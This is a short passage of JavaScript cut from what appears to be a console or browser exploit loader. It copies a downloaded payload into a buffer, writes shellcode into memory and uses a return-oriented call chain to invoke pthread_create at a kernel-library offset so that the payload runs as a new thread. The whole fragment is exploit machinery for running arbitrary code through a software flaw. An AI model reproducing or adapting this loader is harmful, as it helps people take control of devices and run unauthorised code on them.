                    tmp.set(new Uint8Array(req.response), 0);
                    tmp.set(padding, req.response.byteLength);

                    pl.set(shellcode,0);

                    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
                }
